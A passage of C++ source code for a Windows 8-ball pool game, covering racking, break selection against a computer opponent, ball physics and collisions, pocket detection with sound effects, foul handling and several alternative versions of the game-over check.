        eightBall.x = rackPositions[eightBallRackIndex].x;
        eightBall.y = rackPositions[eightBallRackIndex].y;
        eightBall.vx = 0;
        eightBall.vy = 0;
        eightBall.isPocketed = false;
        balls.push_back(eightBall); // Add 8 ball to the main vector

        // 2. Place the shuffled Solids and Stripes in the remaining spots
        size_t otherBallIdx = 0;
        //int otherBallIdx = 0;
        for (int i = 0; i < 15; ++i) {
            if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

            if (otherBallIdx < otherBalls.size()) {
                Ball& ballToPlace = otherBalls[otherBallIdx++];
                ballToPlace.x = rackPositions[i].x;
                ballToPlace.y = rackPositions[i].y;
                ballToPlace.vx = 0;
                ballToPlace.vy = 0;
                ballToPlace.isPocketed = false;
                balls.push_back(ballToPlace); // Add to the main game vector
            }
        }
        // --- End Racking Logic ---


        // --- Determine Who Breaks and Initial State ---
        if (isPlayer2AI) {
            /*// AI Mode: Randomly decide who breaks
            if ((rand() % 2) == 0) {
                // AI (Player 2) breaks
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
                aiTurnPending = true; // Trigger AI logic
            }
            else {
                // Player 1 (Human) breaks
                currentPlayer = 1;
                currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
                aiTurnPending = false;*/
            switch (openingBreakMode) {
            case CPU_BREAK:
                currentPlayer = 2; // AI breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            case P1_BREAK:
                currentPlayer = 1; // Player 1 breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = false;
                break;
            case FLIP_COIN_BREAK:
                if ((rand() % 2) == 0) { // 0 for AI, 1 for Player 1
                    currentPlayer = 2; // AI breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = true;
                }
                else {
                    currentPlayer = 1; // Player 1 breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = false;
                }
                break;
            default: // Fallback to CPU break
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            }
        }
        else {
            // Human vs Human, Player 1 always breaks (or could add a flip coin for HvsH too if desired)
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT;
            aiTurnPending = false; // No AI involved
        }

        // Reset other relevant game state variables
        foulCommitted = false;
        gameOverMessage = L"""";
        firstBallPocketedAfterBreak = false;
        // pocketedThisTurn cleared at start
        // Reset shot parameters and input flags
        shotPower = 0.0f;
        cueSpinX = 0.0f;
        cueSpinY = 0.0f;
        isAiming = false;
        isDraggingCueBall = false;
        isSettingEnglish = false;
        cueAngle = 0.0f; // Reset aim angle
    }


    // --------------------------------------------------------------------------------
    // Full GameUpdate(): integrates AI call?pocket ? aim ? shoot (no omissions)
    // --------------------------------------------------------------------------------
    void GameUpdate() {
        // --- 1) Handle an in?flight shot ---
        if (currentGameState == SHOT_IN_PROGRESS) {
            UpdatePhysics();
            // ? clear old 8?ball pocket info before any new pocket checks
            //lastEightBallPocketIndex = -1;
            CheckCollisions();
            CheckPockets(); // FIX: This line was missing. It's essential to check for pocketed balls every frame.

            if (AreBallsMoving()) {
                isAiming = false;
                aiIsDisplayingAim = false;
            }

            if (!AreBallsMoving()) {
                ProcessShotResults();
            }
            return;
        }

        // --- 2) CPU’s turn (table is static) ---
        if (isPlayer2AI && currentPlayer == 2 && !AreBallsMoving()) {
            // ??? If we've just auto?entered AI_THINKING for the 8?ball call, actually make the decision ???
            if (currentGameState == AI_THINKING && aiTurnPending) {
                aiTurnPending = false;        // consume the pending flag
                AIMakeDecision();             // CPU calls its pocket or plans its shot
                return;                       // done this tick
            }

            // ??? Automate the AI pocket?selection click ???
            if (currentGameState == CHOOSING_POCKET_P2) {
                // AI immediately confirms its call and moves to thinking/shooting
                currentGameState = AI_THINKING;
                aiTurnPending = true;
                return; // process on next tick
            }
            // 2A) If AI is displaying its aim line, count down then shoot
            if (aiIsDisplayingAim) {
                aiAimDisplayFramesLeft--;
                if (aiAimDisplayFramesLeft <= 0) {
                    aiIsDisplayingAim = false;
                    if (aiPlannedShotDetails.isValid) {
                        firstHitBallIdThisShot = -1;
                        cueHitObjectBallThisShot = false;
                        railHitAfterContact = false;
                        std::thread([](const TCHAR* soundName) {
                            PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT);
                            }, TEXT(""cue.wav"")).detach();

                            ApplyShot(
                                aiPlannedShotDetails.power,
                                aiPlannedShotDetails.angle,
                                aiPlannedShotDetails.spinX,
                                aiPlannedShotDetails.spinY
                            );
                            aiPlannedShotDetails.isValid = false;
                    }
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false;
                    pocketedThisTurn.clear();
                }
                return;
            }

            // 2B) Immediately after calling pocket, transition into AI_THINKING
            if (currentGameState == CHOOSING_POCKET_P2 && aiTurnPending) {
                // Start thinking/shooting right away—no human click required
                currentGameState = AI_THINKING;
                aiTurnPending = false;
                AIMakeDecision();
                return;
            }

            // 2C) If AI has pending actions (break, ball?in?hand, or normal turn)
            if (aiTurnPending) {
                if (currentGameState == BALL_IN_HAND_P2) {
                    AIPlaceCueBall();
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                else if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
                    AIBreakShot();
                }
                else if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING) {
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                return;
            }
        }
    }


    // --- Physics and Collision ---
    void UpdatePhysics() {
        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b = balls[i];
            if (!b.isPocketed) {
                b.x += b.vx;
                b.y += b.vy;

                // Apply friction
                b.vx *= FRICTION;
                b.vy *= FRICTION;

                // Stop balls if velocity is very low
                if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                    b.vx = 0;
                    b.vy = 0;
                }

                /* -----------------------------------------------------------------
       Additional clamp to guarantee the ball never escapes the table.
       The existing wall–collision code can momentarily disable the
       reflection test while the ball is close to a pocket mouth;
       that rare case allowed it to ‘slide’ through the cushion and
       leave the board.  We therefore enforce a final boundary check
       after the normal physics step.
       ----------------------------------------------------------------- */
                const float leftBound = TABLE_LEFT + BALL_RADIUS;
                const float rightBound = TABLE_RIGHT - BALL_RADIUS;
                const float topBound = TABLE_TOP + BALL_RADIUS;
                const float bottomBound = TABLE_BOTTOM - BALL_RADIUS;

                if (b.x < leftBound) { b.x = leftBound;   b.vx = fabsf(b.vx); }
                if (b.x > rightBound) { b.x = rightBound;  b.vx = -fabsf(b.vx); }
                if (b.y < topBound) { b.y = topBound;    b.vy = fabsf(b.vy); }
                if (b.y > bottomBound) { b.y = bottomBound; b.vy = -fabsf(b.vy); }
            }
        }
    }

    void CheckCollisions() {
        float left = TABLE_LEFT;
        float right = TABLE_RIGHT;
        float top = TABLE_TOP;
        float bottom = TABLE_BOTTOM;
        const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f;

        // --- Reset Per-Frame Sound Flags ---
        bool playedWallSoundThisFrame = false;
        bool playedCollideSoundThisFrame = false;
        // ---

        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b1 = balls[i];
            if (b1.isPocketed) continue;

            bool nearPocket[6];
            for (int p = 0; p < 6; ++p) {
                nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
            }
            bool nearTopLeftPocket = nearPocket[0];
            bool nearTopMidPocket = nearPocket[1];
            bool nearTopRightPocket = nearPocket[2];
            bool nearBottomLeftPocket = nearPocket[3];
            bool nearBottomMidPocket = nearPocket[4];
            bool nearBottomRightPocket = nearPocket[5];

            bool collidedWallThisBall = false;

            // --- Ball-Wall Collisions ---
            // (Check logic unchanged, added sound calls and railHitAfterContact update)
            // Left Wall
            if (b1.x - BALL_RADIUS < left) {
                if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                    b1.x = left + BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Right Wall
            if (b1.x + BALL_RADIUS > right) {
                if (!nearTopRightPocket && !nearBottomRightPocket) {
                    b1.x = right - BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Top Wall
            if (b1.y - BALL_RADIUS < top) {
                if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                    b1.y = top + BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Bottom Wall
            if (b1.y + BALL_RADIUS > bottom) {
                if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                    b1.y = bottom - BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }

            // Spin effect (Unchanged)
            if (collidedWallThisBall) {
                if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { b1.vy += cueSpinX * b1.vx * 0.05f; }
                if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { b1.vx -= cueSpinY * b1.vy * 0.05f; }
                cueSpinX *= 0.7f; cueSpinY *= 0.7f;
            }


            // --- Ball-Ball Collisions ---
            for (size_t j = i + 1; j < balls.size(); ++j) {
                Ball& b2 = balls[j];
                if (b2.isPocketed) continue;

                float dx = b2.x - b1.x; float dy = b2.y - b1.y;
                float distSq = dx * dx + dy * dy;
                float minDist = BALL_RADIUS * 2.0f;

                if (distSq > 1e-6 && distSq < minDist * minDist) {
                    float dist = sqrtf(distSq);
                    float overlap = minDist - dist;
                    float nx = dx / dist; float ny = dy / dist;

                    // Separation (Unchanged)
                    b1.x -= overlap * 0.5f * nx; b1.y -= overlap * 0.5f * ny;
                    b2.x += overlap * 0.5f * nx; b2.y += overlap * 0.5f * ny;

                    float rvx = b1.vx - b2.vx; float rvy = b1.vy - b2.vy;
                    float velAlongNormal = rvx * nx + rvy * ny;

                    if (velAlongNormal > 0) { // Colliding
                        // --- Play Ball Collision Sound ---
                        if (!playedCollideSoundThisFrame) {
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""poolballhit.wav"")).detach();
                            playedCollideSoundThisFrame = true; // Set flag
                        }
                        // --- End Sound ---

                        // --- NEW: Track First Hit and Cue/Object Collision ---
                        if (firstHitBallIdThisShot == -1) { // If first hit hasn't been recorded yet
                            if (b1.id == 0) { // Cue ball hit b2 first
                                firstHitBallIdThisShot = b2.id;
                                cueHitObjectBallThisShot = true;
                            }
                            else if (b2.id == 0) { // Cue ball hit b1 first
                                firstHitBallIdThisShot = b1.id;
                                cueHitObjectBallThisShot = true;
                            }
                            // If neither is cue ball, doesn't count as first hit for foul purposes
                        }
                        else if (b1.id == 0 || b2.id == 0) {
                            // Track subsequent cue ball collisions with object balls
                            cueHitObjectBallThisShot = true;
                        }
                        // --- End First Hit Tracking ---


                        // Impulse (Unchanged)
                        float impulse = velAlongNormal;
                        b1.vx -= impulse * nx; b1.vy -= impulse * ny;
                        b2.vx += impulse * nx; b2.vy += impulse * ny;

                        // Spin Transfer (Unchanged)
                        if (b1.id == 0 || b2.id == 0) {
                            float spinEffectFactor = 0.08f;
                            b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            cueSpinX *= 0.85f; cueSpinY *= 0.85f;
                        }
                    }
                }
            } // End ball-ball loop
        } // End ball loop
    } // End CheckCollisions


    bool CheckPockets() {
        bool anyPocketed = false;
        // FIX: Declare a local flag to ensure the sound only plays ONCE per function call.
        bool ballPocketedThisCheck = false;
        // For each ball not already pocketed:
        for (auto& b : balls) {
            if (b.isPocketed)
                continue;

            // Check against each pocket
            for (int p = 0; p < 6; ++p) {
                float dx = b.x - pocketPositions[p].x;
                float dy = b.y - pocketPositions[p].y;
                if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                    // It's in the pocket—remove it from play
                    // If it's the 8?ball, remember which pocket it went into
                    if (b.id == 8) {
                        lastEightBallPocketIndex = p;   // <-- Must set here!
                    }
                    b.isPocketed = true;
                    b.vx = b.vy = 0.0f;           // kill any movement
                    pocketedThisTurn.push_back(b.id);
                    anyPocketed = true;

                    // --- FIX: Insert your sound logic here ---
                    // The 'if' guard prevents multiple sounds on a multi-ball break.
                    if (!ballPocketedThisCheck) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""pocket.wav"")).detach();
                        ballPocketedThisCheck = true;
                    }
                    // --- End Sound Fix ---

                    break;  // no need to check other pockets for this ball
                }
            }
        }
        return anyPocketed;
    }

    bool AreBallsMoving() {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
                return true;
            }
        }
        return false;
    }

    void RespawnCueBall(bool behindHeadstring) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {
            // Determine the initial target position
            float targetX, targetY;
            if (behindHeadstring) {
                targetX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }
            else {
                targetX = TABLE_LEFT + TABLE_WIDTH / 2.0f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }

            // FOOLPROOF FIX: Check if the target spot is valid. If not, nudge it until it is.
            int attempts = 0;
            while (!IsValidCueBallPosition(targetX, targetY, behindHeadstring) && attempts < 100) {
                // If the spot is occupied, try nudging the ball slightly.
                targetX += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                targetY += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                // Clamp to stay within reasonable bounds
                targetX = std::max(TABLE_LEFT + BALL_RADIUS, std::min(targetX, TABLE_RIGHT - BALL_RADIUS));
                targetY = std::max(TABLE_TOP + BALL_RADIUS, std::min(targetY, TABLE_BOTTOM - BALL_RADIUS));
                attempts++;
            }

            // Set the final, valid position.
            cueBall->x = targetX;
            cueBall->y = targetY;
            cueBall->vx = 0;
            cueBall->vy = 0;
            cueBall->isPocketed = false;

            // Set the correct game state for ball-in-hand.
            if (currentPlayer == 1) {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else {
                currentGameState = BALL_IN_HAND_P2;
                if (isPlayer2AI) {
                    aiTurnPending = true;
                }
            }
        }
    }


    // --- Game Logic ---

    void ApplyShot(float power, float angle, float spinX, float spinY) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {

            // --- Play Cue Strike Sound (Threaded) ---
            if (power > 0.1f) { // Only play if it's an audible shot
                std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
            }
            // --- End Sound ---

            cueBall->vx = cosf(angle) * power;
            cueBall->vy = sinf(angle) * power;

            // Apply English (Spin) - Simplified effect (Unchanged)
            cueBall->vx += sinf(angle) * spinY * 0.5f;
            cueBall->vy -= cosf(angle) * spinY * 0.5f;
            cueBall->vx -= cosf(angle) * spinX * 0.5f;
            cueBall->vy -= sinf(angle) * spinX * 0.5f;

            // Store spin (Unchanged)
            cueSpinX = spinX;
            cueSpinY = spinY;

            // --- Reset Foul Tracking flags for the new shot ---
            // (Also reset in LBUTTONUP, but good to ensure here too)
            firstHitBallIdThisShot = -1;      // No ball hit yet
            cueHitObjectBallThisShot = false; // Cue hasn't hit anything yet
            railHitAfterContact = false;     // No rail hit after contact yet
            // --- End Reset ---

                    // If this was the opening break shot, clear the flag
            if (isOpeningBreakShot) {
                isOpeningBreakShot = false; // Mark opening break as taken
            }
        }
    }


    // ---------------------------------------------------------------------
    //  ProcessShotResults()
    // ---------------------------------------------------------------------
    void ProcessShotResults() {
        bool cueBallPocketed = false;
        bool eightBallPocketed = false;
        bool playerContinuesTurn = false;

        // --- Step 1: Update Ball Counts FIRST (THE CRITICAL FIX) ---
        // We must update the score before any other game logic runs.
        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        int ownBallsPocketedThisTurn = 0;

        for (int id : pocketedThisTurn) {
            Ball* b = GetBallById(id);
            if (!b) continue;

            if (b->id == 0) {
                cueBallPocketed = true;
            }
            else if (b->id == 8) {
                eightBallPocketed = true;
            }
            else {
                // This is a numbered ball. Update the pocketed count for the correct player.
                if (b->type == player1Info.assignedType && player1Info.assignedType != BallType::NONE) {
                    player1Info.ballsPocketedCount++;
                }
                else if (b->type == player2Info.assignedType && player2Info.assignedType != BallType::NONE) {
                    player2Info.ballsPocketedCount++;
                }

                if (b->type == shootingPlayer.assignedType) {
                    ownBallsPocketedThisTurn++;
                }
            }
        }

        if (ownBallsPocketedThisTurn > 0) {
            playerContinuesTurn = true;
        }

        // --- Step 2: Handle Game-Ending 8-Ball Shot ---
        // Now that the score is updated, this check will have the correct information.
        if (eightBallPocketed) {
            CheckGameOverConditions(true, cueBallPocketed);
            if (currentGameState == GAME_OVER) {
                pocketedThisTurn.clear();
                return;
            }
        }

        // --- Step 3: Check for Fouls ---
        bool turnFoul = false;
        if (cueBallPocketed) {
            turnFoul = true;
        }
        else {
            Ball* firstHit = GetBallById(firstHitBallIdThisShot);
            if (!firstHit) { // Rule: Hitting nothing is a foul.
                turnFoul = true;
            }
            else { // Rule: Hitting the wrong ball type is a foul.
                if (player1Info.assignedType != BallType::NONE) { // Colors are assigned.
                    // We check if the player WAS on the 8-ball BEFORE this shot.
                    bool wasOnEightBall = (shootingPlayer.assignedType != BallType::NONE && (shootingPlayer.ballsPocketedCount - ownBallsPocketedThisTurn) >= 7);
                    if (wasOnEightBall) {
                        if (firstHit->id != 8) turnFoul = true;
                    }
                    else {
                        if (firstHit->type != shootingPlayer.assignedType) turnFoul = true;
                    }
                }
            }
        } //reenable below disabled for debugging
        //if (!turnFoul && cueHitObjectBallThisShot && !railHitAfterContact && pocketedThisTurn.empty()) {
            //turnFoul = true;
        //}
        foulCommitted = turnFoul;

        // --- Step 4: Final State Transition ---
        if (foulCommitted) {
            SwitchTurns();
            RespawnCueBall(false);
        }
        else if (player1Info.assignedType == BallType::NONE && !pocketedThisTurn.empty() && !cueBallPocketed) {
            // Assign types on the break.
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->type != BallType::EIGHT_BALL) {
                    AssignPlayerBallTypes(b->type);
                    break;
                }
            }
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else if (playerContinuesTurn) {
            // The player's turn continues. Now the check will work correctly.
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else {
            SwitchTurns();
        }

        pocketedThisTurn.clear();
    }

    /*
    // --- Step 3: Final State Transition ---
    if (foulCommitted) {
        SwitchTurns();
        RespawnCueBall(false);
    }
    else if (playerContinuesTurn) {
        CheckAndTransitionToPocketChoice(currentPlayer);
    }
    else {
        SwitchTurns();
    }

    pocketedThisTurn.clear();
    } */

    //  Assign groups AND optionally give the shooter his first count.
    bool AssignPlayerBallTypes(BallType firstPocketedType, bool creditShooter /*= true*/)
    {
        if (firstPocketedType != SOLID && firstPocketedType != STRIPE)
            return false;                                 // safety

        /* ---------------------------------------------------------
           1.  Decide the groups
        --------------------------------------------------------- */
        if (currentPlayer == 1)
        {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }
        else
        {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }

        /* ---------------------------------------------------------
           2.  Count the very ball that made the assignment
        --------------------------------------------------------- */
        if (creditShooter)
        {
            if (currentPlayer == 1)
                ++player1Info.ballsPocketedCount;
            else
                ++player2Info.ballsPocketedCount;
        }
        return true;
    }

    /*bool AssignPlayerBallTypes(BallType firstPocketedType) {
        if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
            if (currentPlayer == 1) {
                player1Info.assignedType = firstPocketedType;
                player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            else {
                player2Info.assignedType = firstPocketedType;
                player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            return true; // Assignment was successful
        }
        return false; // No assignment made (e.g., 8-ball was pocketed on break)
    }*/
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.


    // --- Called in ProcessShotResults() after pocket detection ---
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        // Only care if the 8?ball really went in:
        if (!eightBallPocketed) return;

        // Who’s shooting now?
        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        // Which pocket did we CALL?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did it ACTUALLY fall into?
        int actual = lastEightBallPocketIndex;

        // Check legality: must have called a pocket ?0, must match actual,
        // must have pocketed all 7 of your balls first, and must not have scratched.
        bool legal = (called >= 0)
            && (called == actual)
            && (shooter.ballsPocketedCount >= 7)
            && (!cueBallPocketed);

        // Build a message that shows both values for debugging/tracing:
        if (legal) {
            gameOverMessage = shooter.name
                + L"" Wins! ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name
                + L"" Wins! (Illegal 8-Ball) ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }



    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return;

        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponentPlayer = (currentPlayer == 1) ? player2Info : player1Info;

        // Handle 8-ball on break: re-spot and continue.
        if (player1Info.assignedType == BallType::NONE) {
            Ball* b = GetBallById(8);
            if (b) { b->isPocketed = false; b->x = RACK_POS_X; b->y = RACK_POS_Y; b->vx = b->vy = 0; }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // --- FOOLPROOF WIN/LOSS LOGIC ---
        bool wasOnEightBall = IsPlayerOnEightBall(currentPlayer);
        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = -1;

        // Find which pocket the 8-ball actually went into.
        for (int id : pocketedThisTurn) {
            if (id == 8) {
                Ball* b = GetBallById(8); // This ball is already marked as pocketed, but we need its last coords.
                if (b) {
                    for (int p_idx = 0; p_idx < 6; ++p_idx) {
                        // Check last known position against pocket centers
                        if (GetDistanceSq(b->x, b->y, pocketPositions[p_idx].x, pocketPositions[p_idx].y) < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                            actualPocket = p_idx;
                            break;
                        }
                    }
                }
                break;
            }
        }

        // Evaluate win/loss based on a clear hierarchy of rules.
        if (!wasOnEightBall) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball Pocketed Early)"";
        }
        else if (cueBallPocketed) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Scratched on 8-Ball)"";
        }
        else if (calledPocket == -1) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Pocket Not Called)"";
        }
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball in Wrong Pocket)"";
        }
        else {
            // WIN! All loss conditions failed, this must be a legal win.
            gameOverMessage = shootingPlayer.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    }*/

    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        // Which pocket did we call?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did the ball really fall into?
        int actual = lastEightBallPocketIndex;

        // Legal victory only if:
        //  1) Shooter had already pocketed 7 of their object balls,
        //  2) They called a pocket,
        //  3) The 8?ball actually fell into that same pocket,
        //  4) They did not scratch on the 8?ball.
        bool legal =
            (shooter.ballsPocketedCount >= 7) &&
            (called >= 0) &&
            (called == actual) &&
            (!cueBallPocketed);

        if (legal) {
            gameOverMessage = shooter.name + L"" Wins! ""
                L""(called: "" + std::to_wstring(called) +
                L"", actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name + L"" Wins! (illegal 8-ball) ""
            // For debugging you can append:
            + L"" (called: "" + std::to_wstring(called)
            + L"", actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    // ????????????????????????????????????????????????????????????????
    //  CheckGameOverConditions()
    //     – Called when the 8-ball has fallen.
    //     – Decides who wins and builds the gameOverMessage.
    // ????????????????????????????????????????????????????????????????
    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;                     // safety

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = lastEightBallPocketIndex;

        bool clearedSeven = (shooter.ballsPocketedCount >= 7);
        bool noScratch = !cueBallPocketed;
        bool callMade = (calledPocket >= 0);

        // helper ? turn “-1” into ""None"" for readability
        auto pocketToStr = [](int idx) -> std::wstring
        {
            return (idx >= 0) ? std::to_wstring(idx) : L""None"";
        };

        if (clearedSeven && noScratch && callMade && actualPocket == calledPocket)
        {
            // legitimate win
            gameOverMessage =
                shooter.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }
        else
        {
            // wrong pocket, scratch, or early 8-ball
            gameOverMessage =
                opponent.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    /* void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return; // Only when 8-ball actually pocketed

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        bool      onEightRoll = IsPlayerOnEightBall(currentPlayer);
        int       calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int       actualPocket = -1;
        Ball* bEight = GetBallById(8);

        // locate which hole the 8-ball went into
        if (bEight) {
            for (int i = 0; i < 6; ++i) {
                if (GetDistanceSq(bEight->x, bEight->y,
                    pocketPositions[i].x, pocketPositions[i].y)
                    < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                    actualPocket = i; break;
                }
            }
        }

        // 1) On break / pre-assignment: re-spot & continue
        if (player1Info.assignedType == BallType::NONE) {
            if (bEight) {
                bEight->isPocketed = false;
                bEight->x = RACK_POS_X; bEight->y = RACK_POS_Y;
                bEight->vx = bEight->vy = 0;
            }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // 2) Loss if pocketed 8 early
        if (!onEightRoll) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" pocketed 8-ball early)"";
        }
        // 3) Loss if scratched
        else if (cueBallPocketed) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" scratched on 8-ball)"";
        }
        // 4) Loss if no pocket call
        else if (calledPocket < 0) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" did not call a pocket)"";
        }
        // 5) Loss if in wrong pocket
        else if (actualPocket != calledPocket) {
